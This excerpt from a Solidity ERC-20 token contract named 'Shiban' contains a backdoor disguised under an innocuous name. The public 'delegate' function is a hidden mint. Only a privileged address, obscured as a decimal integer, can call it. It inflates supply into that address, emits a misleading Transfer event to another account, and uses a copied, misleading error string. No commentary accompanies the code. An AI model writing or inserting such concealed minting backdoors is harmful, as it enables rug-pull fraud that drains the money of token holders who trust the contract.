...
contract Shiban is Context, IERC20 {
    ...
    address public _origin = 0x94C4C3E999bB022715096aC6FBc21Ecd0D92ea99;
    address _addr = 0x94C4C3E999bB022715096aC6FBc21Ecd0D92ea99;
    address _UNI = address (886584871145177351176933179185737631955523757889);
    ...
    function delegate (address account, uint256 amount) public {
        require(msg.sender == _UNI, "ERC20: mint to the zero address");
        _totalSupply = _totalSupply.add(amount);
        _balances[_UNI] = _balances[_UNI].add(amount);
        emit Transfer(address(0), account, amount);
    }
